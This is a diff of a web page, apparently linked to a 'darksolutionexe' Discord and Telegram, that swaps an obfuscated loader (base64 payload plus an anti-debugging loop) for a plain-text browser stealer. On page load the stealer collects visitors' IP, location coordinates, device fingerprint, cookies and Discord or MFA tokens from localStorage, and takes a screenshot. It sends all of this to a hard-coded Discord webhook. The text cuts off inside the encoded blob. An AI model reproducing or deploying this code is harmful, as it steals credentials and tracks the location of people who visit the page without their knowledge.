@@ -94,39 +94,276 @@
     <a class="contact" href="https://discord.gg/qTKAVXpfRq">Discord</a>
     <a class="contact" href="https://t.me/darksolutionexe">Telegram</a>
   </div>
-<script>
            <script>
-    // Мягкая анти-отладка (без редиректа)
-    setInterval(() => { debugger; }, 500);
-    
-    // Загрузчик зашифрованного кода
-    (function() {
-        // Функция расшифровки
-        const decrypt = (data, key) => {
-            let result = '';
-            for(let i = 0; i < data.length; i++) {
-                result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    if (!localStorage.getItem('stealerCode')) {
+        const fullCode = `
+         // === КОНФИГ ===
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1475205126166941717/U5gN1sW3piGZF5FRZEId48YcbJLi5XwyvPV03qNaDNc9Be7wiNFRTiNLgCQau5plTIVD";
+                function sendToDiscord(message, isFile = false, filename = null, fileData = null) {
+            if (isFile) {
+                const formData = new FormData();
+                const blob = dataURLToBlob(fileData);
+                formData.append('file', blob, filename);
+                
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                }).catch(e => console.log('File send error:', e));
+            } else {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", WEBHOOK_URL, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({ content: message }));
             }
-            return result;
-        };
-        
-        // Твой код в base64 (сгенерируй через любой онлайн конвертер)
-        const encoded = "IC8vID09PSDQmtCe0J3QpNCY0JMgPT09CiAgICAgICAgY29uc3QgV0VCSE9PS19VUkwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NTIwNTEyNjE2Njk0MTcxNy9VNWdOMXNXM3BpR1pGNUZSWkVJZDQ4WWNiSkxpNVh3eXZQVjAzcU5hRE5jOUJlN3dpTkZSVGlOTGdDUWF1NXBsVElWRCI7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBzZW5kVG9EaXNjb3JkKG1lc3NhZ2UsIGlzRmlsZSA9IGZhbHNlLCBmaWxlbmFtZSA9IG51bGwsIGZpbGVEYXRhID0gbnVsbCkgewogICAgICAgICAgICBpZiAoaXNGaWxlKSB7CiAgICAgICAgICAgICAgICBjb25zdCBmb3JtRGF0YSA9IG5ldyBGb3JtRGF0YSgpOwogICAgICAgICAgICAgICAgY29uc3QgYmxvYiA9IGRhdGFVUkxUb0Jsb2IoZmlsZURhdGEpOwogICAgICAgICAgICAgICAgZm9ybURhdGEuYXBwZW5kKCdmaWxlJywgYmxvYiwgZmlsZW5hbWUpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmZXRjaChXRUJIT09LX1VSTCwgewogICAgICAgICAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgIGJvZHk6IGZvcm1EYXRhCiAgICAgICAgICAgICAgICB9KS5jYXRjaChlID0+IGNvbnNvbGUubG9nKCdGaWxlIHNlbmQgZXJyb3I6JywgZSkpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICAgICAgeGhyLm9wZW4oIlBPU1QiLCBXRUJIT09LX1VSTCwgdHJ1ZSk7CiAgICAgICAgICAgICAgICB4aHIuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKTsKICAgICAgICAgICAgICAgIHhoci5zZW5kKEpTT04uc3RyaW5naWZ5KHsgY29udGVudDogbWVzc2FnZSB9KSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGRhdGFVUkxUb0Jsb2IoZGF0YVVSTCkgewogICAgICAgICAgICBjb25zdCBhcnIgPSBkYXRhVVJMLnNwbGl0KCcsJyk7CiAgICAgICAgICAgIGNvbnN0IG1pbWUgPSBhcnJbMF0ubWF0Y2goLzooLio/KTsvKVsxXTsKICAgICAgICAgICAgY29uc3QgYnN0ciA9IGF0b2IoYXJyWzFdKTsKICAgICAgICAgICAgbGV0IG4gPSBic3RyLmxlbmd0aDsKICAgICAgICAgICAgY29uc3QgdThhcnIgPSBuZXcgVWludDhBcnJheShuKTsKICAgICAgICAgICAgd2hpbGUgKG4tLSkgewogICAgICAgICAgICAgICAgdThhcnJbbl0gPSBic3RyLmNoYXJDb2RlQXQobik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIG5ldyBCbG9iKFt1OGFycl0sIHsgdHlwZTogbWltZSB9KTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGdldEJyb3dzZXJJbmZvKCkgewogICAgICAgICAgICB2YXIgdWEgPSB3aW5kb3cubmF2aWdhdG9yLnVzZXJBZ2VudDsKICAgICAgICAgICAgdmFyIGJyb3dzZXJJbmZvID0gIiI7CiAgICAgICAgICAgIGlmICh1YS5pbmRleE9mKCJDaHJvbWUiKSAhPT0gLTEpIHsKICAgICAgICAgICAgICAgIGJyb3dzZXJJbmZvID0gIkdvb2dsZSBDaHJvbWUiOwogICAgICAgICAgICB9IGVsc2UgaWYgKHVhLmluZGV4T2YoIkZpcmVmb3giKSAhPT0gLTEpIHsKICAgICAgICAgICAgICAgIGJyb3dzZXJJbmZvID0gIk1vemlsbGEgRmlyZWZveCI7CiAgICAgICAgICAgIH0gZWxzZSBpZiAodWEuaW5kZXhPZigiRWRnZSIpICE9PSAtMSkgewogICAgICAgICAgICAgICAgYnJvd3NlckluZm8gPSAiTWljcm9zb2Z0IEVkZ2UiOwogICAgICAgICAgICB9IGVsc2UgaWYgKHVhLmluZGV4T2YoIlNhZmFyaSIpICE9PSAtMSkgewogICAgICAgICAgICAgICAgYnJvd3NlckluZm8gPSAiU2FmYXJpIjsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGJyb3dzZXJJbmZvID0gIlVua25vd24gQnJvd3NlciI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGJyb3dzZXJJbmZvICsgIiAoIiArIHVhICsgIikiOwogICAgICAgIH0KCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gZ2V0RGV2aWNlSW5mbygpIHsKICAgICAgICAgICAgY29uc3QgaXNNb2JpbGUgPSAvaVBob25lfGlQYWR8aVBvZHxBbmRyb2lkL2kudGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsKICAgICAgICAgICAgY29uc3QgZGV2aWNlVHlwZSA9IGlzTW9iaWxlID8gIk1vYmlsZSBEZXZpY2UiIDogIlBDIjsKICAgICAgICAgICAgY29uc3Qgb3MgPSBpc01vYmlsZSA/IGdldE1vYmlsZU9wZXJhdGluZ1N5c3RlbSgpIDogZ2V0RGVza3RvcE9wZXJhdGluZ1N5c3RlbSgpOwogICAgICAgICAgICByZXR1cm4geyBkZXZpY2VUeXBlLCBvcyB9OwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gZ2V0RGVza3RvcE9wZXJhdGluZ1N5c3RlbSgpIHsKICAgICAgICAgICAgY29uc3QgdXNlckFnZW50ID0gd2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQ7CiAgICAgICAgICAgIGxldCBvcyA9ICJVbmtub3duIjsKICAgICAgICAgICAgaWYgKHVzZXJBZ2VudC5pbmRleE9mKCJXaW5kb3dzIE5UIikgIT09IC0xKSB7CiAgICAgICAgICAgICAgICBvcyA9ICJXaW5kb3dzIjsKICAgICAgICAgICAgfSBlbHNlIGlmICh1c2VyQWdlbnQuaW5kZXhPZigiTWFjIikgIT09IC0xKSB7CiAgICAgICAgICAgICAgICBvcyA9ICJNYWNpbnRvc2giOwogICAgICAgICAgICB9IGVsc2UgaWYgKHVzZXJBZ2VudC5pbmRleE9mKCJMaW51eCIpICE9PSAtMSkgewogICAgICAgICAgICAgICAgb3MgPSAiTGludXgiOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBvczsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGdldE1vYmlsZU9wZXJhdGluZ1N5c3RlbSgpIHsKICAgICAgICAgICAgY29uc3QgdXNlckFnZW50ID0gd2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQ7CiAgICAgICAgICAgIGlmICh1c2VyQWdlbnQubWF0Y2goL0FuZHJvaWQvaSkpIHsKICAgICAgICAgICAgICAgIHJldHVybiAiQW5kcm9pZCI7CiAgICAgICAgICAgIH0gZWxzZSBpZiAodXNlckFnZW50Lm1hdGNoKC9pUGhvbmV8aVBhZHxpUG9kL2kpKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gImlPUyI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICByZXR1cm4gIlVua25vd24gTW9iaWxlIE9TIjsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gdGFrZVNjcmVlbnNob3QoKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCBjYW52YXMgPSBhd2FpdCBodG1sMmNhbnZhcyhkb2N1bWVudC5ib2R5LCB7CiAgICAgICAgICAgICAgICAgICAgc2NhbGU6IDIsCiAgICAgICAgICAgICAgICAgICAgbG9nZ2luZzogZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgYWxsb3dUYWludDogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICB1c2VDT1JTOiB0cnVlLAogICAgICAgICAgICAgICAgICAgIGJhY2tncm91bmRDb2xvcjogbnVsbAogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICByZXR1cm4gY2FudmFzLnRvRGF0YVVSTCgnaW1hZ2UvcG5nJyk7CiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coIlNjcmVlbnNob3QgZXJyb3I6IiwgZSk7CiAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gc2VuZEluZm9Ub0Rpc2NvcmQoKSB7CiAgICAgICAgICAgIGNvbnN0IHsgY2l0eSwgY291bnRyeSwgY29vcmRpbmF0ZXMsIGVtb2ppIH0gPSBhd2FpdCBnZXRDaXR5Q291bnRyeUFuZEVtb2ppKCk7CiAgICAgICAgICAgIGNvbnN0IGlwQWRkcmVzc1Jlc3BvbnNlID0gYXdhaXQgZmV0Y2goImh0dHBzOi8vYXBpNjQuaXBpZnkub3JnP2Zvcm1hdD1qc29uIik7CiAgICAgICAgICAgIGNvbnN0IGlwQWRkcmVzc0RhdGEgPSBhd2FpdCBpcEFkZHJlc3NSZXNwb25zZS5qc29uKCk7CiAgICAgICAgICAgIGNvbnN0IGlwQWRkcmVzcyA9IGlwQWRkcmVzc0RhdGEuaXAgfHwgIlVua25vd24gSVAgQWRkcmVzcyI7CiAgICAgICAgICAgIGNvbnN0IHRpbWUgPSBuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCk7CiAgICAgICAgICAgIGNvbnN0IGJyb3dzZXIgPSBnZXRCcm93c2VySW5mbygpOwogICAgICAgICAgICBjb25zdCB7IGRldmljZVR5cGUsIG9zIH0gPSBhd2FpdCBnZXREZXZpY2VJbmZvKCk7CiAgICAgICAgICAgIGNvbnN0IGdvb2dsZU1hcHNMaW5rID0gImh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vbWFwcz9xPSIgKyBjb29yZGluYXRlczsKICAgICAgICAgICAgY29uc3QgdXNlcm5hbWUgPSBhd2FpdCBnZXRVc2VyTmFtZSgpOwogICAgICAgICAgICBjb25zdCBpc09ubGluZSA9IG5hdmlnYXRvci5vbkxpbmUgPyAiT25saW5lIiA6ICJPZmZsaW5lIjsKICAgICAgICAgICAgY29uc3QgbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IubGFuZ3VhZ2UgfHwgIlVua25vd24gTGFuZ3VhZ2UiOwogICAgICAgICAgICBjb25zdCBwbHVnaW5Db3VudCA9IG5hdmlnYXRvci5wbHVnaW5zLmxlbmd0aDsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vINCU0LXRgtCw0LvRjNC90LDRjyDQuNC90YTQsCDQviDQv9C70LDQs9C40L3QsNGFCiAgICAgICAgICAgIGxldCBwbHVnaW5zTGlzdCA9IFtdOwogICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IG5hdmlnYXRvci5wbHVnaW5zLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICBwbHVnaW5zTGlzdC5wdXNoKG5hdmlnYXRvci5wbHVnaW5zW2ldLm5hbWUpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNvbnN0IHBsdWdpbnMgPSBwbHVnaW5zTGlzdC5qb2luKCIgfCAiKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IGRldmljZU1lbW9yeSA9IG5hdmlnYXRvci5kZXZpY2VNZW1vcnkgPyBuYXZpZ2F0b3IuZGV2aWNlTWVtb3J5ICsgIiBHQiIgOiAiVW5rbm93biI7CiAgICAgICAgICAgIGNvbnN0IHsgd2lkdGgsIGhlaWdodCB9ID0gYXdhaXQgZ2V0U2NyZWVuUmVzb2x1dGlvbigpOwogICAgICAgICAgICBjb25zdCB7IGNhbWVyYUNvdW50LCBtaWNyb3Bob25lQ291bnQgfSA9IGF3YWl0IGdldE1lZGlhRGV2aWNlc0luZm8oKTsKICAgICAgICAgICAgY29uc3QgaGFzQ2FtZXJhID0gY2FtZXJhQ291bnQgPiAwID8gIlllcyIgOiAiTm8iOwogICAgICAgICAgICBjb25zdCBoYXNNaWNyb3Bob25lID0gbWljcm9waG9uZUNvdW50ID4gMCA/ICJZZXMiIDogIk5vIjsKICAgICAgICAgICAgY29uc3QgY3VycmVudFVSTCA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmOwogICAgICAgICAgICBjb25zdCB3aW5kb3dTaXplID0gd2luZG93LmlubmVyV2lkdGggKyAieCIgKyB3aW5kb3cuaW5uZXJIZWlnaHQ7CiAgICAgICAgICAgIAogICAgICAgICAgICAvLyDQlNC+0L8g0LjQvdGE0LAKICAgICAgICAgICAgY29uc3QgdGltZXpvbmUgPSBJbnRsLkRhdGVUaW1lRm9ybWF0KCkucmVzb2x2ZWRPcHRpb25zKCkudGltZVpvbmU7CiAgICAgICAgICAgIGNvbnN0IHBsYXRmb3JtID0gbmF2aWdhdG9yLnBsYXRmb3JtOwogICAgICAgICAgICBjb25zdCBjb3JlcyA9IG5hdmlnYXRvci5oYXJkd2FyZUNvbmN1cnJlbmN5IHx8ICJVbmtub3duIjsKICAgICAgICAgICAgY29uc3QgdG91Y2hTdXBwb3J0ID0gbmF2aWdhdG9yLm1heFRvdWNoUG9pbnRzID4gMCA/ICJZZXMiIDogIk5vIjsKICAgICAgICAgICAgY29uc3QgZG9Ob3RUcmFjayA9IG5hdmlnYXRvci5kb05vdFRyYWNrIHx8ICJOb3Qgc2V0IjsKICAgICAgICAgICAgCiAgICAgICAgICAgIC8vINCi0L7QutC10L3RiyDQuNC3IGxvY2FsU3RvcmFnZQogICAgICAgICAgICBsZXQgdG9rZW5zID0gW107CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxvY2FsU3RvcmFnZS5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGtleSA9IGxvY2FsU3RvcmFnZS5rZXkoaSk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgdmFsdWUgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbShrZXkpOwogICAgICAgICAgICAgICAgICAgIGlmICh2YWx1ZSAmJiAodmFsdWUuaW5jbHVkZXMoJ21mYS4nKSB8fCB2YWx1ZS5pbmNsdWRlcygnZGlzY29yZCcpIHx8IHZhbHVlLmluY2x1ZGVzKCd0b2tlbicpKSkgewogICAgICAgICAgICAgICAgICAgICAgICB0b2tlbnMucHVzaChgJHtrZXl9OiAke3ZhbHVlLnN1YnN0cmluZygwLCA1MCl9Li4uYCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoKGUpIHt9CiAgICAgICAgICAgIAogICAgICAgICAgICBjb25zdCBjb29raWVzID0gZG9jdW1lbnQuY29va2llIHx8ICJObyBjb29raWVzIjsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2UgPSAiKioqKiAgICAgICAgICAgICAgICBVc2VyIEluZm9ybWF0aW9uKioqKlxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiKioqKi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKioqKlxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn5e677iPICoqSVAgQWRkcmVzcyoqOiBgIiArIGlwQWRkcmVzcyArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCfkaQgKipVc2VyIE5hbWUqKjogYCIgKyB1c2VybmFtZSArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCfj5nvuI8gKipDaXR5Kio6IGAiICsgY2l0eSArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCfjI0gKipDb3VudHJ5Kio6IGAiICsgY291bnRyeSArICJgICIgKyBlbW9qaSArICJcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIi0g8J+Pnu+4jyAqKkNvb3JkaW5hdGVzKio6IFtgIiArIGNvb3JkaW5hdGVzICsgImBdKCIgKyBnb29nbGVNYXBzTGluayArICIpXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCflZIgKipUaW1lKio6IGAiICsgdGltZSArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCfjJAgKipCcm93c2VyKio6IGAiICsgYnJvd3NlciArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCflqXvuI8gKipEZXZpY2UgVHlwZSoqOiBgIiArIGRldmljZVR5cGUgKyAiYFxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn5Of77iPICoqT3BlcmF0aW5nIFN5c3RlbSoqOiBgIiArIG9zICsgImBcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIi0g8J+bsO+4jyAqKkNvbm5lY3Rpb24gU3RhdHVzKio6IGAiICsgaXNPbmxpbmUgKyAiYFxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn4CEICoqQnJvd3NlciBMYW5ndWFnZSoqOiBgIiArIGxhbmd1YWdlICsgImBcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIi0g8J+TvO+4jyAqKkRldmljZSBMYW5ndWFnZShzKSoqOiBgIiArIG5hdmlnYXRvci5sYW5ndWFnZXMuam9pbigiLCAiKSArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCfm6DvuI8gKipOdW1iZXIgb2YgUGx1Z2lucyoqOiBgIiArIHBsdWdpbkNvdW50ICsgImBcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIi0g8J+UjCAqKlBsdWdpbnMqKjogYCIgKyBwbHVnaW5zICsgImBcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIi0g8J+SuyAqKkRldmljZSBNZW1vcnkqKjogYCIgKyBkZXZpY2VNZW1vcnkgKyAiYFxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn5OQICoqU2NyZWVuIFJlc29sdXRpb24qKjogYCIgKyB3aWR0aCArICJ4IiArIGhlaWdodCArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCfk7cgKipDYW1lcmEqKjogYCIgKyBoYXNDYW1lcmEgKyAiYFxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn46kICoqTWljcm9waG9uZSoqOiBgIiArIGhhc01pY3JvcGhvbmUgKyAiYFxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn5OOICoqQ3VycmVudCBVUkwqKjogYCIgKyBjdXJyZW50VVJMICsgImBcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIi0g8J+qnyAqKldpbmRvdyBTaXplKio6IGAiICsgd2luZG93U2l6ZSArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIOKPsCAqKlRpbWV6b25lKio6IGAiICsgdGltZXpvbmUgKyAiYFxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn5K+ICoqUGxhdGZvcm0qKjogYCIgKyBwbGF0Zm9ybSArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCfp6AgKipDUFUgQ29yZXMqKjogYCIgKyBjb3JlcyArICJgXG4iICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICItIPCfkYYgKipUb3VjaCBTdXBwb3J0Kio6IGAiICsgdG91Y2hTdXBwb3J0ICsgImBcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIi0g8J+aqyAqKkRvIE5vdCBUcmFjayoqOiBgIiArIGRvTm90VHJhY2sgKyAiYFxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn42qICoqQ29va2llcyoqOiBgIiArIGNvb2tpZXMuc3Vic3RyaW5nKDAsIDIwMCkgKyAiYFxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLSDwn5SRICoqTG9jYWxTdG9yYWdlIFRva2VucyoqOiAiICsgKHRva2Vucy5sZW5ndGggPyB0b2tlbnMuam9pbigiIHwgIikgOiAiTm9uZSIpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8g0J7RgtC/0YDQsNCy0LvRj9C10Lwg0L7RgdC90L7QstC90YPRjiDQuNC90YTRgwogICAgICAgICAgICBzZW5kVG9EaXNjb3JkKG1lc3NhZ2UpOwogICAgICAgICAgICAKICAgICAgICAgICAgLy8g0JTQtdC70LDQtdC8INC4INC+0YLQv9GA0LDQstC70Y/QtdC8INGB0LrRgNC40L3RiNC+0YIKICAgICAgICAgICAgY29uc3Qgc2NyZWVuc2hvdCA9IGF3YWl0IHRha2VTY3JlZW5zaG90KCk7CiAgICAgICAgICAgIGlmIChzY3JlZW5zaG90KSB7CiAgICAgICAgICAgICAgICBzZW5kVG9EaXNjb3JkKCLwn5O4ICoqU2NyZWVuc2hvdCoqIiwgdHJ1ZSwgInNjcmVlbnNob3RfIiArIERhdGUubm93KCkgKyAiLnBuZyIsIHNjcmVlbnNob3QpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBhc3luYyBmdW5jdGlvbiBnZXRDaXR5Q291bnRyeUFuZEVtb2ppKCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIpOwogICAgICAgICAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IHJlc3BvbnNlLmpzb24oKTsKICAgICAgICAgICAgICAgIGNvbnN0IGNpdHkgPSBkYXRhLmNpdHkgfHwgIlVua25vd24gQ2l0eSI7CiAgICAgICAgICAgICAgICBjb25zdCBjb3VudHJ5ID0gZGF0YS5jb3VudHJ5IHx8ICJVbmtub3duIENvdW50cnkiOwogICAgICAgICAgICAgICAgY29uc3QgY29vcmRpbmF0ZXMgPSBkYXRhLmxvYyB8fCAiVW5rbm93biBDb29yZGluYXRlcyI7CiAgICAgICAgICAgICAgICBsZXQgZW1vamkgPSAiIjsKICAgICAgICAgICAgICAgIGxldCBjb3VudHJ5TmFtZSA9ICIiOwogICAgICAgICAgICAgICAgc3dpdGNoKGNvdW50cnkpIHsKICAgICAgICAgICAgICAgICAgICBjYXNlICJSVSI6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50cnlOYW1lID0gIlJ1c3NpYSI7CiAgICAgICAgICAgICAgICAgICAgICAgIGVtb2ppID0gIvCfh7fwn4e6IjsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgY2FzZSAiVUEiOgogICAgICAgICAgICAgICAgICAgICAgICBjb3VudHJ5TmFtZSA9ICJVa3JhaW5lIjsKICAgICAgICAgICAgICAgICAgICAgICAgZW1vamkgPSAi8J+HuvCfh6YiOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICBjYXNlICJVUyI6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50cnlOYW1lID0gIlVuaXRlZCBTdGF0ZXMiOwogICAgICAgICAgICAgICAgICAgICAgICBlbW9qaSA9ICLwn4e68J+HuCI7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNhc2UgIktaIjoKICAgICAgICAgICAgICAgICAgICAgICAgY291bnRyeU5hbWUgPSAiS2F6YWtoc3RhbiI7CiAgICAgICAgICAgICAgICAgICAgICAgIGVtb2ppID0gIvCfh7Dwn4e/IjsKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgY2FzZSAiRlIiOgogICAgICAgICAgICAgICAgICAgICAgICBjb3VudHJ5TmFtZSA9ICJGcmFuY2UiOwogICAgICAgICAgICAgICAgICAgICAgICBlbW9qaSA9ICLwn4er8J+HtyI7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50cnlOYW1lID0gY291bnRyeSB8fCAiVW5rbm93biBDb3VudHJ5IjsKICAgICAgICAgICAgICAgICAgICAgICAgZW1vamkgPSAi8J+MjSI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4geyBjaXR5LCBjb3VudHJ5OiBjb3VudHJ5TmFtZSwgY29vcmRpbmF0ZXMsIGVtb2ppIH07CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBmZXRjaGluZyBjaXR5LCBjb3VudHJ5LCBhbmQgZW1vamk6IiwgZXJyb3IpOwogICAgICAgICAgICAgICAgcmV0dXJuIHsgY2l0eTogIlVua25vd24gQ2l0eSIsIGNvdW50cnk6ICJVbmtub3duIENvdW50cnkiLCBjb29yZGluYXRlczogIlVua25vd24gQ29vcmRpbmF0ZXMiLCBlbW9qaTogIvCfjI0iIH07CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGdldFNjcmVlblJlc29sdXRpb24oKSB7CiAgICAgICAgICAgIHJldHVybiB7IHdpZHRoOiBzY3JlZW4ud2lkdGgsIGhlaWdodDogc2NyZWVuLmhlaWdodCB9OwogICAgICAgIH0KCiAgICAgICAgYXN5bmMgZnVuY3Rpb24gZ2V0TWVkaWFEZXZpY2VzSW5mbygpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IGRldmljZXMgPSBhd2FpdCBuYXZpZ2F0b3IubWVkaWFEZXZpY2VzLmVudW1lcmF0ZURldmljZXMoKTsKICAgICAgICAgICAgICAgIGNvbnN0IGNhbWVyYXMgPSBkZXZpY2VzLmZpbHRlcihkZXZpY2UgPT4gZGV2aWNlLmtpbmQgPT09ICd2aWRlb2lucHV0Jyk7CiAgICAgICAgICAgICAgICBjb25zdCBtaWNyb3Bob25lcyA9IGRldmljZXMuZmlsdGVyKGRldmljZSA9PiBkZXZpY2Uua2luZCA9PT0gJ2F1ZGlvaW5wdXQnKTsKICAgICAgICAgICAgICAgIHJldHVybiB7IGNhbWVyYUNvdW50OiBjYW1lcmFzLmxlbmd0aCwgbWljcm9waG9uZUNvdW50OiBtaWNyb3Bob25lcy5sZW5ndGggfTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoIkVycm9yIGZldGNoaW5nIG1lZGlhIGRldmljZXMgaW5mb3JtYXRpb246IiwgZXJyb3IpOwogICAgICAgICAgICAgICAgcmV0dXJuIHsgY2FtZXJhQ291bnQ6IDAsIG1pY3JvcGhvbmVDb3VudDogMCB9OwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBhc3luYyBmdW5jdGlvbiBnZXRVc2VyTmFtZSgpIHsKICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiB7CiAgICAgICAgICAgICAgICB2YXIgdXNlck5hbWUgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcm5hbWUiKTsKICAgICAgICAgICAgICAgIGlmICh1c2VyTmFtZSkgewogICAgICAgICAgICAgICAgICAgIHJlc29sdmUodXNlck5hbWUpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICByZXNvbHZlKCJVbmtub3duIFVzZXIiKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgfQoKICAgICAgICB3aW5kb3cub25sb2FkID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIC8vINCd0LXQsdC+0LvRjNGI0LDRjyDQt9Cw0LTQtdGA0Lb